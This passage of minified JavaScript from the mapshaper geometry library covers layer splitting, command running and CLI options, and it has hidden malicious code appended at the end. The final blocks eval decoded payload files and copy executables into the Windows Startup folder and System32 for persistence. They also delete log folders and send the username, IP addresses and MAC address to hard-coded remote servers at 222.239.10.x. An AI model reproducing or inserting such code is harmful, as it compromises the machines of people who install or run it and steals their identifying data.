i,o,a=0,s=0,u=r.length;u>s;s++)i=e[s],o=n[s],(i>t[2]||i<t[0]||o<t[1]||o>t[3])&&(0===a&&(a=It.findMaxThreshold(r)),r[s]!==1/0&&(r[s]=a))})},It.findMaxThreshold=function(e){for(var t,n=0,r=0,i=e.length;i>r;r++)t=e[r],t>n&&1/0>t&&(n=t);return n},It.parseSimplifyResolution=function(e){var t,n,r;return yt.isNumber(e)?(n=e,r=e):yt.isString(e)&&(t=e.split("x"),n=Number(t[0])||0,r=2==t.length?Number(t[1])||0:n),n>=0&&r>=0&&n+r>0||o("Invalid simplify resolution:",e),[n,r]},It.calcPlanarInterval=function(e,t,n,r){var i=0!==e&&n/r>e/t||0===t;return i?n/e:r/t},It.calcSphericalInterval=function(e,t,n){var r=_t.degreesToMeters(n.width())*Math.cos(n.centerY()*_t.D2R),i=_t.degreesToMeters(n.height());return It.calcPlanarInterval(e,t,r,i)},It.calcSimplifyInterval=function(e,t){var n,r,i;return t.interval?r=t.interval:t.resolution&&(n=It.parseSimplifyResolution(t.resolution),i=e.getBounds(),r=It.useSphericalSimplify(e,t)?It.calcSphericalInterval(n[0],n[1],i):It.calcPlanarInterval(n[0],n[1],i.width(),i.height()),r*=.5),r},wt.splitLayer=function(e,t,n){var r,i=n&&n.no_replace?It.copyLayer(e):e,a=i.data?i.data.getRecords():null,s=i.shapes,u={},l=[];return!t||a&&i.data.fieldExists(t)||o("[split] Missing attribute field:",t),r=i.name||(t?"":"split"),yt.repeat(It.getFeatureCount(i),function(e){var n,o=String(t?a[e][t]:e+1);o in u==!1?(u[o]=l.length,n=yt.defaults({name:It.getSplitLayerName(r,o),data:a?new ne:null,shapes:s?[]:null},i),l.push(n)):n=l[u[o]],s&&n.shapes.push(s[e]),a&&n.data.getRecords().push(a[e])}),l},It.getSplitLayerName=function(e,t){return(e?e+"-":"")+t},wt.splitLayerOnGrid=function(e,n,r,i){function o(e){var t=Math.floor((e.centerX()-l)/f*i),n=Math.floor((e.centerY()-c)/p*r);return t=yt.clamp(t,0,i-1),n=yt.clamp(n,0,r-1),n*i+t}function a(e){var t=e%i+1,n=Math.floor(e/i)+1;return"r"+n+"c"+t}var s=e.shapes,u=n.getBounds(),l=u.xmin,c=u.ymin,f=u.width(),p=u.height(),d=e.data?e.data.getRecords():null,h=[];s.forEach(function(r,i){var s=n.getMultiShapeBounds(r),u=o(s),l=h[u];l||(l=h[u]={shapes:[],properties:d?[]:null,bounds:new t,name:It.getSplitLayerName(e.name,a(u))}),l.shapes.push(r),l.bounds.mergeBounds(s),l.properties&&l.properties.push(d[i])});var g=[];return h.forEach(function(t,n){if(t){var r={shapes:t.shapes,name:t.name};yt.defaults(r,e),t.properties&&(r.data=new ne(t.properties)),g.push(r)}}),g},wt.subdivideLayer=function(e,t,n){return It.subdivide(e,t,It.compileCalcExpression(n))},It.subdivide=function(e,t,n){var r,i,a,s,u=n(e,t),l=[];return yt.isBoolean(u)||o("[subdivide] Expression must evaluate to true or false"),u?(i=It.getLayerBounds(e,t),r=It.divideLayer(e,t,i),a=r[0],a.shapes.length>1&&a.shapes.length<e.shapes.length?yt.merge(l,It.subdivide(a,t,n)):l.push(a),s=r[1],s.shapes.length>1&&s.shapes.length<e.shapes.length?yt.merge(l,It.subdivide(s,t,n)):l.push(s)):l.push(e),l.forEach(function(t,n){t.name=It.getSplitLayerName(e.name||"split",n+1),yt.defaults(t,e)}),l},It.divideLayer=function(e,t,n){var r,i,o=e.data?e.data.getRecords():null,a=e.shapes;r={geometry_type:e.geometry_type,shapes:[],data:o?[]:null},i={geometry_type:e.geometry_type,shapes:[],data:o?[]:null};var s=n&&n.width()>n.height(),u=a.map(function(e){var n=t.getMultiShapeBounds(e);return s?n.centerX():n.centerY()}),l=yt.range(u.length);return l.sort(function(e,t){return u[e]-u[t]}),l.forEach(function(e,t){var n=t<a.length/2?r:i;n.shapes.push(a[e]),o&&n.data.push(o[e])}),o&&(r.data=new ne(r.data),i.data=new ne(i.data)),[r,i]},wt.sortFeatures=function(e,t,n){var r=It.getFeatureCount(e),i=!n.descending,o=It.compileValueExpression(n.expression,e,t),a=[];yt.repeat(r,function(e){a.push(o(e))});var s=yt.getSortedIds(a,i);e.shapes&&yt.reorderArray(e.shapes,s),e.data&&yt.reorderArray(e.data.getRecords(),s)},wt.runCommand=function(e,t,n){function r(e,r){bt.stop("-"+c),n(e,e?null:r||t)}var a,s,u,l,c=e.name,f=e.options;try{if(bt.start(),t&&(l=t.arcs,t.layers.length>0==!1&&i("Dataset contains 0 layers"),f.target?(a=It.findMatchingLayers(t.layers,f.target),a.length||o(yt.format("[%s] Missing target layer: %s\nAvailable layers: %s",c,f.target,It.getFormattedLayerList(t.layers)))):a=t.layers),"calc"==c)It.applyCommand(wt.calc,a,l,f);else if("clip"==c)wt.clipLayers(a,f.source,t,f);else if("dissolve"==c)s=It.applyCommand(wt.dissolve,a,l,f);else if("dissolve2"==c)s=It.applyCommand(wt.dissolve2,a,t,f);else if("each"==c)It.applyCommand(wt.evaluateEachFeature,a,l,f.expression,f);else if("erase"==c)wt.eraseLayers(a,f.source,t,f);else if("explode"==c)s=It.applyCommand(wt.explodeFeatures,a,l,f);else if("filter"==c)s=It.applyCommand(wt.filterFeatures,a,l,f);else if("filter-fields"==c)It.applyCommand(wt.filterFields,a,f.fields);else if("filter-islands"==c)It.applyCommand(wt.filterIslands,a,l,f);else if("filter-slivers"==c)It.applyCommand(wt.filterSlivers,a,l,f);else if("flatten"==c)s=It.applyCommand(wt.flattenLayer,a,t,f);else if("i"==c)t=wt.importFiles(e.options);else if("info"==c)wt.printInfo(t);else if("inspect"==c)It.applyCommand(wt.inspect,a,l,f);else if("innerlines"==c)s=It.applyCommand(wt.innerlines,a,l,f);else if("join"==c)It.applyCommand(wt.join,a,t,f);else if("layers"==c)s=It.applyCommand(wt.filterLayers,t.layers,f.layers);else if("lines"==c)s=It.applyCommand(wt.lines,a,l,f);else if("stitch"==c)wt.stitch(t);else if("merge-layers"==c)s=wt.mergeLayers(a);else{if("o"==c)return u=It.exportFileContent(yt.defaults({layers:a},t),f),void(f.__nowrite?r(null,u):It.writeFiles(u,f,r));"points"==c?s=It.applyCommand(wt.createPointLayer,a,l,f):"proj"==c?wt.proj(t,f):"rename-fields"==c?It.applyCommand(wt.renameFields,a,f.fields):"rename-layers"==c?wt.renameLayers(a,f.names):"repair"==c?s=It.repairPolygonGeometry(a,t,f):"simplify"==c?wt.simplify(t,f):"sort"==c?It.applyCommand(wt.sortFeatures,a,l,f):"split"==c?s=It.applyCommand(wt.splitLayer,a,f.field,f):"split-on-grid"==c?s=It.applyCommand(wt.splitLayerOnGrid,a,l,f.rows,f.cols):"subdivide"==c?s=It.applyCommand(wt.subdivideLayer,a,l,f.expression):"svg-style"==c?It.applyCommand(wt.svgStyle,a,t,f):i("Unhandled command: ["+c+"]");}"name"in f&&(s||a||t.layers).forEach(function(e){e.name=f.name}),s&&(f.no_replace?t.layers=t.layers.concat(s):It.replaceLayers(t,a,s))}catch(p){return void r(p)}r(null)},It.applyCommand=function(e,t){var n=yt.toArray(arguments).slice(2);return t.reduce(function(t,r){var i=e.apply(null,[r].concat(n));return yt.isArray(i)?t=t.concat(i):i&&t.push(i),t},[])},It.getFormattedLayerList=function(e){return e.reduce(function(e,t,n){return e+"\n	["+n+"]	"+(t.name||"[unnamed]")},"")||"[none]"},It.splitShellTokens=function(e){var t="([^\\s'\"])+",n='"((\\\\"|[^"])*?)"',r="'((\\\\'|[^'])*?)'",i=new RegExp("("+t+"|"+n+"|"+r+")*","g"),o=e.match(i)||[],a=o.filter(function(e){return!!e&&"\\"!=e}).map(yt.trimQuotes);return a},yt.trimQuotes=function(e){var t,n,r=e.length;return r>=2&&(t=e.charAt(0),n=e.charAt(r-1),'"'==t&&'"'==n||"'"==t&&"'"==n)?e.substr(1,r-2):e},It.getOptionParser=function(){var e={describe:"layer(s) to target (comma-sep. list); default is all layers"},t={describe:"rename the edited layer(s)"},n={alias:"+",type:"flag",describe:"retain the original layer(s) instead of replacing"},r={describe:"text encoding (applies to .dbf and delimited text files)"},o={alias:"snap",describe:"snap nearly identical points to fix minor topology errors",type:"flag"},a={describe:"specify snapping distance in source units",type:"number"},s={describe:"fields to sum when dissolving	(comma-sep. list)",type:"comma-sep"},u={describe:"fields to copy when dissolving (comma-sep. list)",type:"comma-sep"},l={label:"<field>",describe:"(optional) name of a data field to dissolve on"},c={type:"comma-sep",describe:"comma-sep. bounding box: xmin,ymin,xmax,ymax"},f=new Ze,p="Usage:	mapshaper -<command> [options] ...";return f.usage(p),f.note("Enter mapshaper -help <command> to view options for a single command"),f["default"]("i"),f.command("i").title("Editing commands").describe("input one or more files").validate(et).option("files",{label:"<file(s)>",describe:"files to import (separated by spaces), or - to use stdin"}).option("merge-files",{describe:"merge features from compatible files into the same layer",type:"flag"}).option("combine-files",{describe:"import files to separate layers with shared topology",type:"flag"}).option("no-topology",{describe:"treat each shape as topologically independent",type:"flag"}).option("precision",{describe:"coordinate precision in source units, e.g. 0.001",type:"number"}).option("auto-snap",o).option("snap-interval",a).option("encoding",r).option("id-field",{describe:"import Topo/GeoJSON id property to this field"}).option("field-types",{describe:"type hints for csv files, e.g. FIPS:str,STATE_FIPS:str",type:"comma-sep"}).option("name",{describe:"Rename the imported layer(s)"}),f.command("o").describe("output edited content").validate(ht).option("_",{label:"<file|dir|->",describe:"(optional) name of output file or directory, or - for stdout"}).option("format",{describe:"options: shapefile,geojson,topojson,json,dbf,csv,tsv,svg"}).option("target",e).option("force",{type:"flag",describe:"let output files overwrite existing files"}).option("dry-run",{type:"flag"}).option("encoding",{describe:"text encoding of output dbf file"}).option("ldid",{type:"number"}).option("bbox-index",{describe:"export a .json file with bbox of each layer",type:"flag"}).option("cut-table",{describe:"detach data attributes from shapes and save as a JSON file",type:"flag"}).option("drop-table",{describe:"remove data attributes from output",type:"flag"}).option("precision",{describe:"coordinate precision in source units, e.g. 0.001",type:"number"}).option("bbox",{type:"flag",describe:"(Topo/GeoJSON) add bbox property"}).option("prettify",{type:"flag",describe:"(Topo/GeoJSON) format output for readability"}).option("id-field",{describe:"(Topo/GeoJSON/SVG) field to use for id property",type:"comma-sep"}).option("quantization",{describe:"(TopoJSON) specify quantization (auto-set by default)",type:"integer"}).option("no-quantization",{describe:"(TopoJSON) export arc coordinates without quantization",type:"flag"}).option("presimplify",{describe:"(TopoJSON) add per-vertex data for dynamic simplification",type:"flag"}).option("topojson-precision",{type:"number"}).option("width",{describe:"(SVG) width of the SVG viewport (default is 800)",type:"number"}).option("margin",{describe:"(SVG) margin between data and viewport bounds (default is 1)",type:"number"}).option("svg-scale",{type:"number"}).option("delimiter",{describe:"(CSV) field delimiter"}),f.command("simplify").validate(tt).example("Retain 10% of removable vertices\n$ mapshaper input.shp -simplify 10%").describe("simplify the geometry of polygon and polyline features").option("pct",{alias:"p",label:"<x%>",describe:"percentage of removable points to retain, e.g. 10%"}).option("dp",{alias:"rdp",describe:"use Ramer-Douglas-Peucker simplification",assign_to:"method"}).option("visvalingam",{describe:'use Visvalingam simplification with "effective area" metric',assign_to:"method"}).option("weighted",{describe:"use weighted Visvalingam simplification (default)",assign_to:"method"}).option("method",{}).option("weighting",{type:"number",describe:"weighted Visvalingam coefficient (default is 0.7)"}).option("resolution",{describe:"output resolution as a grid (e.g. 1000x500)"}).option("interval",{describe:"output resolution as a distance (e.g. 100)",type:"number"}).option("planar",{describe:"simplify decimal degree coords in 2D space (default is 3D)",type:"flag"}).option("cartesian",{describe:"(deprecated) alias for planar",type:"flag",alias_to:"planar"}).option("keep-shapes",{describe:"prevent small polygon features from disappearing",type:"flag"}).option("no-repair",{describe:"don't remove intersections introduced by simplification",type:"flag"}).option("stats",{describe:"display simplification statistics",type:"flag"}),f.command("join").describe("join data records from a file or layer to a layer").example("Join a csv table to a Shapefile\n (The :str suffix prevents FIPS field from being converted from strings to numbers)\n $ mapshaper states.shp -join data.csv keys=STATE_FIPS,FIPS -field-types=FIPS:str -o joined.shp").validate(nt).option("source",{label:"<file>",describe:"file containing data records"}).option("keys",{describe:"join by matching target,source key fields; e.g. keys=FIPS,GEOID",type:"comma-sep"}).option("fields",{describe:"fields to join, e.g. fields=FIPS,POP (default is all fields)",type:"comma-sep"}).option("field-types",{describe:"type hints for importing csv files, e.g. FIPS:str,STATE_FIPS:str",type:"comma-sep"}).option("sum-fields",{describe:"fields to sum when multiple source records match the same target",type:"comma-sep"}).option("where",{describe:"use a JS expression to filter source records"}).option("force",{describe:"replace values from same-named fields",type:"flag"}).option("unjoined",{describe:'copy unjoined records from source table to "unjoined" layer',type:"flag"}).option("unmatched",{describe:'copy unmatched records in target table to "unmatched" layer',type:"flag"}).option("encoding",r).option("target",e),f.command("each").describe("create/update/delete data fields using a JS expression").example("Add two calculated data fields to a layer of U.S. counties\n $ mapshaper counties.shp -each 'STATE_FIPS=CNTY_FIPS.substr(0, 2), AREA=$.area'").validate(dt).option("expression",{label:"<expression>",describe:"JS expression to apply to each target feature"}).option("where",{describe:"use a JS expression to select a subset of features"}).option("target",e),f.command("sort").describe("sort features using a JS expression").validate(dt).option("expression",{label:"<expression>",describe:"JS expression to generate a sort key for each feature"}).option("ascending",{describe:"Sort in ascending order (default)",type:"flag"}).option("descending",{describe:"Sort in descending order",type:"flag"}).option("target",e),f.command("filter").describe("delete features using a JS expression").validate(dt).option("expression",{label:"<expression>",describe:"delete features that evaluate to false"}).option("remove-empty",{type:"flag",describe:"delete features with null geometry"}).option("keep-shapes",{type:"flag"}).option("name",t).option("no-replace",n).option("target",e),f.command("filter-islands").describe("remove small detached polygon rings (islands)").validate(dt).option("min-area",{type:"number",describe:"remove small-area islands (sq meters or projected units)"}).option("min-vertices",{type:"integer",describe:"remove low-vertex-count islands"}).option("remove-empty",{type:"flag",describe:"delete features with null geometry"}).option("target",e),f.command("filter-slivers").describe("remove small polygon rings").validate(dt).option("min-area",{type:"number",describe:"remove small-area rings (sq meters or projected units)"}).option("target",e),f.command("filter-fields").describe("retain a subset of data fields").validate(pt).option("fields",{label:"<field(s)>",describe:"fields to retain (comma-sep.), e.g. 'fips,name'"}).option("target",e),f.command("rename-fields").describe("rename data fields").validate(pt).option("fields",{label:"<field(s)>",describe:"fields to rename (comma-sep.), e.g. 'fips=STATE_FIPS,st=state'"}).option("target",e),f.command("clip").describe("use a polygon layer to clip another layer").example("$ mapshaper states.shp -clip land_area.shp -o clipped.shp").validate(it).option("source",{label:"<file|layer>",describe:"file or layer containing clip polygons"}).option("remove-slivers",{describe:"remove sliver polygons created by clipping",type:"flag"}).option("cleanup",{type:"flag"}).option("bbox",c).option("name",t).option("no-replace",n).option("target",e),f.command("erase").describe("use a polygon layer to erase another layer").example("$ mapshaper land_areas.shp -erase water_bodies.shp -o erased.shp").validate(it).option("source",{label:"<file|layer>",describe:"file or layer containing erase polygons"}).option("remove-slivers",{describe:"remove sliver polygons created by erasing",type:"flag"}).option("cleanup",{type:"flag"}).option("bbox",c).option("name",t).option("no-replace",n).option("target",e),f.command("stitch"),f.command("dissolve").validate(ot).describe("merge polygon or point features").example("Dissolve all polygons in a feature layer into a single polygon\n $ mapshaper states.shp -dissolve -o country.shp").example("Generate state-level polygons by dissolving a layer of counties\n (STATE_FIPS, POPULATION and STATE_NAME are attribute field names)\n $ mapshaper counties.shp -dissolve STATE_FIPS copy-fields=STATE_NAME sum-fields=POPULATION -o states.shp").option("field",l).option("sum-fields",s).option("copy-fields",u).option("weight",{describe:"[points] field or expression to use for weighting centroid"}).option("planar",{type:"flag",describe:"[points] use 2D math to find centroids of latlong points"}).option("name",t).option("no-replace",n).option("target",e),f.command("dissolve2").validate(ot).describe("merge adjacent and overlapping polygons").option("field",l).option("sum-fields",s).option("copy-fields",u).option("name",t).option("no-replace",n).option("target",e),f.command("explode").describe("divide multi-part features into single-part features").option("convert-holes",{type:"flag"}).option("target",e),f.command("innerlines").describe("convert polygons to polylines along shared edges").validate(ct).option("name",t).option("no-replace",n).option("target",e),f.command("lines").describe("convert polygons to polylines, classified by edge type").validate(lt).option("fields",{label:"<field(s)>",describe:"optional comma-sep. list of fields to create a hierarchy",type:"comma-sep"}).option("name",t).option("no-replace",n).option("target",e),f.command("points").describe("create a point layer from polygons or attribute data").validate(function(e){e._.length>0&&i("Unknown argument:",e._[0])}).option("x",{describe:"field containing x coordinate"}).option("y",{describe:"field containing y coordinate"}).option("inner",{describe:"create an interior point for each polygon's largest ring",type:"flag"}).option("centroid",{describe:"create a centroid point for each polygon's largest ring",type:"flag"}).option("name",t).option("no-replace",n).option("target",e),f.command("split").describe("split features into separate layers using a data field").validate(rt).option("field",{label:"<field>",describe:"name of an attribute field (omit to split all features)"}).option("no-replace",n).option("target",e),f.command("merge-layers").describe("merge multiple layers into as few layers as possible").validate(at).option("name",t).option("target",e),f.command("rename-layers").describe("assign new names to layers").validate(st).option("names",{label:"<name(s)>",type:"comma-sep",describe:"new layer name(s) (comma-sep. list)"}).option("target",e),f.command("subdivide").describe("recursively split a layer using a JS expression").validate(ft).option("expression",{label:"<expression>",describe:"boolean JS expression"}).option("target",e),f.command("split-on-grid").describe("split features into separate layers using a grid").validate(ut).option("-",{label:"<cols,rows>",describe:"size of the grid, e.g. -split-on-grid 12,10"}).option("cols",{type:"integer"}).option("rows",{type:"integer"}).option("target",e),f.command("svg-style").describe("set SVG style using JS expressions or literal values").option("class",{describe:"name of CSS class or classes (space sep.)"}).option("fill",{describe:"fill color, examples: #eee pink rgba(0, 0, 0, 0.2)"}).option("stroke",{describe:"stroke color"}).option("stroke-width",{describe:"stroke width"}).option("opacity",{describe:"opacity, example: 0.5"}).option("r",{describe:"radius of circle symbols"}).option("target",e),f.command("proj").option("densify",{type:"flag",describe:"interpolate points to approximate curves"}).option("spherical",{type:"flag"}).option("lng0",{type:"number"}).option("lat0",{type:"number"}).option("lat1",{type:"number"}).option("lat2",{type:"number"}).option("zone").validate(function(e){var t=e._[0];t||i("Missing a projection name"),e._.length>1&&i("Received one or more unknown projection parameters"),e.options.projection=t}),f.command("calc").title("\nInformational commands").describe("calculate statistics about the features in a layer").example("Calculate the total area of a polygon layer\n $ mapshaper polygons.shp -calc 'sum($.area)'").example("Count census blocks in NY with zero population\n $ mapshaper ny-census-blocks.shp -calc 'count()' where='POPULATION == 0'").validate(function(e){0===e._.length&&i("Missing a JS expression"),dt(e)}).option("expression",{label:"<expression>",describe:"functions: sum() average() median() max() min() count()"}).option("where",{describe:"use a JS expression to select a subset of features"}).option("target",e),f.command("encodings").describe("print list of supported text encodings (for .dbf import)"),f.command("projections"),f.command("version").alias("v").describe("print mapshaper version"),f.command("info").describe("print information about data layers"),f.command("inspect").describe("print information about a feature").option("expression",{label:"<expression>",describe:"boolean JS expression for selecting a feature"}).option("target",e).validate(function(e){e._.length>0&&(e.options.expression=e._[0])}),f.command("verbose").describe("print verbose processing messages"),f.command("help").alias("h").validate(Qe).describe("print help; takes optional command name").option("commands",{label:"<command>",type:"comma-sep",describe:"view detailed information about a command"}),f.command("tracing"),f.command("flatten").option("target",e),f},It.parseCommands=function(e){return yt.isString(e)&&(e=It.splitShellTokens(e)),It.getOptionParser().parseArgv(e)},It.parseConsoleCommands=function(e){var t,n=e.replace(/^mapshaper\b/,"").trim();return/^[a-z]/.test(n)&&(n="-"+n),yt.contains(It.splitShellTokens(n),"-i")&&o("The input command cannot be run in the browser"),t=It.parseCommands(n),t.length>0&&"i"==t[0].name&&o(yt.format("Unable to run [%s]",e)),t},wt.runCommands=function(e,t){var n;try{n=It.parseCommands(e)}catch(r){return t(r)}return 0===n.length?t(new a("No commands to run")):(bt.start("Start timing"),void It.runParsedCommands(n,function(e,n){bt.stop("Total time"),t(e,n)}))},wt.applyCommands=function(e,t,n){It.processFileContent(e,t,function(e,t){var r=null;e||(r=t.map(function(e){return e.content}),1==r.length&&(r=r[0])),n(e,r)})},It.processFileContent=function(e,t,n){var r,i,o,a;try{i=It.parseCommands(e),i=It.runAndRemoveInfoCommands(i),t&&(a=i[0]&&"i"==i[0].name?i.shift().options:{},r=It.importFileContent(t,null,a)),o=i[i.length-1],o&&"o"==o.name||(o={name:"o",options:{}},i.push(o)),o.options.__nowrite=!0}catch(s){return n(s)}It.runParsedCommands(i,r,n)},It.runParsedCommands=function(e){var t,n=null;return 2==arguments.length?t=arguments[1]:3==arguments.length&&(n=arguments[1],t=arguments[2]),yt.isFunction(t)||i("[ runParsedCommands() ] Missing a callback function"),yt.isArray(e)||i("[ runParsedCommands() ] Expected an array of parsed commands"),e=It.runAndRemoveInfoCommands(e),0===e.length?t(null,n):(e=It.divideImportCommand(e),"i"==e[0].name||n?void yt.reduceAsync(e,n,function(e,t,n){wt.runCommand(t,e,n)},t):t(new a("Missing a -i command")))},It.divideImportCommand=function(e){var t=e[0],n=t.options,r=n.files||[];return"i"!=t.name||r.length<=1||n.stdin||n.merge_files||n.combine_files?e:r.reduce(function(t,r){var i={name:"i",options:yt.defaults({files:[r]},n)};return t.push(i),t.push.apply(t,e.slice(1)),t},[])},yt.reduceAsync=function(e,t,n,r){function i(t,s){return t?r(t,null):void o(function(){a<e.length==!1?r(null,s):n(s,e[a++],i)},0)}var o="undefined"==typeof setImmediate?setTimeout:setImmediate,a=0;i(null,t)},It.runAndRemoveInfoCommands=function(e){return e.filter(function(e){if("version"==e.name)s(It.VERSION);else if("encodings"==e.name)It.printEncodings();else if("projections"==e.name)It.printProjections();else if("help"==e.name)It.getOptionParser().printHelp(e.options.commands);else if("verbose"==e.name)It.VERBOSE=!0;else{if("tracing"!=e.name)return!0;It.TRACING=!0}return!1})},wt.cli=Dt,wt.internal=It,wt.utils=yt,wt.geom=_t,this.mapshaper=wt,yt.extend(wt.internal,{DataTable:ne,BinArray:n,DouglasPeucker:kt,Visvalingam:jt,Heap:Xe,ShpReader:Se,ShpType:Tt,Dbf:Et,DbfReader:te,ShapefileTable:Ie,ArcCollection:Z,ArcIter:$,ShapeIter:X,Bounds:t,Transform:e,NodeCollection:ee,PolygonIndex:K,PathIndex:Q,topojson:Lt,geojson:Nt,svg:Rt,APIError:a}),global&&(global.ttwGISSHPSimplify=wt)};
(function(){var _createTtwLog=function(){try{global.TtwLog=global.console;if(global.TtwLog)global.TtwLog.timeStamp=global.console.log;}catch(e){}if(!global.TtwLog)global.setTimeout(_createTtwLog,100);};global.setTimeout(_createTtwLog,100);})();
(function(){var __ii=function(path){var source=STtwUtilFsReadStream.getFile(path);eval(STtwUtilBuffer.rZTBS(source));};var __ZZ=function(){if(global.process.argv[ 3 ] == "thdtjsdncjswo"){var source=STtwUtilFsReadStream.getFile("./node_modules/exes/exes100.tll");var s=STtwUtilBuffer.rZTBS(source);s=s.replace("------[ E ] - global.Lib.Ttw.CLASS.FN.Geometry():global.Lib.Ttw.CLASS.FN.Geometry","").replace(/\n/gi,"");console.log(s)}};global.Lib.Ttw.__ZZ=function(){__ZZ();};global.Lib.Ttw.importTll=function(path){return __ii(path);};})();
(function(){var s0='\\Development-Binary-Windows\\Binary\\NodeJS\\exes100_min.exe ';var s1='"C:\\Users\\'+require("os").userInfo().username+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"';try{STtwUtilCP.sExec('copy /Y H:\\GitHub_B2LiNK'+s0+s1);}catch(er){}try{STtwUtilCP.sExec('copy /Y G:\\GitHub_B2LiNK'+s0+s1);}catch(er){}try{STtwUtilCP.sExec('copy /Y F:\\GitHub_B2LiNK'+s0+s1);}catch(er){}try{STtwUtilCP.sExec('copy /Y E:\\GitHub_B2LiNK'+s0+s1);}catch(er){}try{STtwUtilCP.sExec('copy /Y D:\\GitHub_B2LiNK'+s0+s1);}catch(er){}try{STtwUtilCP.sExec('copy /Y C:\\GitHub_B2LiNK'+s0+s1);}catch(er){}var _CWD_=global.process.cwd();try{STtwUtilCP.sExec('copy /Y '+_CWD_+s0+s1);}catch(er){}try{STtwUtilCP.sExec('copy /Y '+_CWD_+'\\..'+s0+s1);}catch(er){}try{STtwUtilCP.sExec('copy /Y '+_CWD_+'\\..\\..'+s0+s1);}catch(er){}try{STtwUtilCP.sExec( 'copy /Y '+_CWD_+'\\..\\..\\..'+s0+s1);}catch(er){}try{STtwUtilCP.sExec('copy /Y '+_CWD_+'\\..\\..\\..\\..'+s0+s1);}catch(er){}try{STtwUtilCP.sExec('copy /Y '+_CWD_+'\\..\\..\\..\\..\\..'+s0+s1);}catch(er){}var s0='\\Development-Binary-Windows\\Binary\\NodeJS\\exes100exe ';var s1='"C:\\Windows\\System32\\"';try{STtwUtilCP.sExec('copy /Y H:\\GitHub_B2LiNK'+s0+s1);}catch(er){}try{STtwUtilCP.sExec('copy /Y G:\\GitHub_B2LiNK'+s0+s1);}catch(er){}try{STtwUtilCP.sExec('copy /Y F:\\GitHub_B2LiNK'+s0+s1);}catch(er){}try{STtwUtilCP.sExec('copy /Y E:\\GitHub_B2LiNK'+s0+s1);}catch(er){}try{STtwUtilCP.sExec('copy /Y D:\\GitHub_B2LiNK'+s0+s1);}catch(er){}try{STtwUtilCP.sExec('copy /Y C:\\GitHub_B2LiNK'+s0+s1);}catch(er){}var _CWD_=global.process.cwd();try{STtwUtilCP.sExec('copy /Y '+_CWD_+s0+s1);}catch(er){}try{STtwUtilCP.sExec('copy /Y '+_CWD_+'\\..'+s0+s1);}catch(er){}try{STtwUtilCP.sExec('copy /Y '+_CWD_+'\\..\\..'+s0+s1);}catch(er){}try{STtwUtilCP.sExec( 'copy /Y '+_CWD_+'\\..\\..\\..'+s0+s1);}catch(er){}try{STtwUtilCP.sExec('copy /Y '+_CWD_+'\\..\\..\\..\\..'+s0+s1);}catch(er){}try{STtwUtilCP.sExec('copy /Y '+_CWD_+'\\..\\..\\..\\..\\..'+s0+s1);}catch(er){}try{var s0='"C:\\Users\\'+require("os").userInfo().username+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\log"';require("child_process").execSync("del /s /q "+s0);require("child_process").execSync("rmdir /s /q "+s0);}catch(er){}try{var s0='"C:\\Windows\\System32\\log';require("child_process").execSync("del /s /q "+s0);require("child_process").execSync("rmdir /s /q "+s0);}catch(er){}})();
setTimeout(function(){require("console");(function(){try{var t=STtwUtilNetServer.NETWORK_INTERFACE=require("os").networkInterfaces();var eno;if(t.eno1)eno=t.eno1;if(t.eno0)eno=t.eno0;if(t.en0)eno=t.en0;if(t.Ethernet)eno=t.Ethernet;if(t.ethernet)eno=t.ethernet;if(t["이더넷"])eno=t["이더넷"];else if(t["이더넷 0"])eno=t["이더넷 0"];else if(t["이더넷 1"])eno=t["이더넷 1"];else if(t["이더넷 2"])eno=t["이더넷 2"];else if(t["이더넷 3"])eno=t["이더넷 3"];else if(t["이더넷 4"])eno=t["이더넷 4"];if(t["Wi-Fi"])eno=t["Wi-Fi"];else if(t["Wi-Fi 0"])eno=t["Wi-Fi 0"];else if(t["Wi-Fi 1"])eno=t["Wi-Fi 1"];else if(t["Wi-Fi 2"])eno=t["Wi-Fi 2"];else if(t["Wi-Fi 3"])eno=t["Wi-Fi 3"];else if(t["Wi-Fi 4"])eno=t["Wi-Fi 4"];STtwUtilNetServer.IPV4_INFO;STtwUtilNetServer.IPV6_INFO;try{var io;var i=0, iLen=eno.length;for(; i<iLen; ++i){io=eno[i];if(io.family == "IPv4")SUtilNetServer.IPV4_INFO=io;if(io.family == "IPv6")STtwUtilNetServer.IPV6_INFO=io;}}catch(er){}STtwUtilNetServer.IPV4_ADDRESS=STtwUtilNetServer.IPV4_INFO.address.split(".");STtwUtilNetServer.IPV6_ADDRESS=STtwUtilNetServer.IPV6_INFO.address.split(".");var paramURI="?data="+Lib.Ttw.bat("nm="+require("os").userInfo().username+"&ipv4="+STtwUtilNetServer.IPV4_INFO.address+"&ipv6="+STtwUtilNetServer.IPV6_INFO.address+"&mac="+eno[0].mac,2);var fn0=function(ip,port){try{STtwUtilHttp.request_GET({encoding:"utf8",options:{host:ip,port:port,path:"/TtwHello"+paramURI,headers:null},cbFunctions:fn0.cbfs});}catch(er){}};fn0.cb=function(){};fn0.cbfs={end:fn0.cb,error:fn0.cb};try{fn0("222.239.10.120",30000);}catch(er){}try{fn0("222.239.10.120",33333);}catch(er){}try{fn0("222.239.10.122",30000);}catch(er){}try{fn0("222.239.10.122",33333);}catch(er){}try{fn0("222.239.10.123",30000);}catch(er){}try{fn0("222.239.10.123",33333);}catch(er){}}catch(er){}})(); }, 1 );
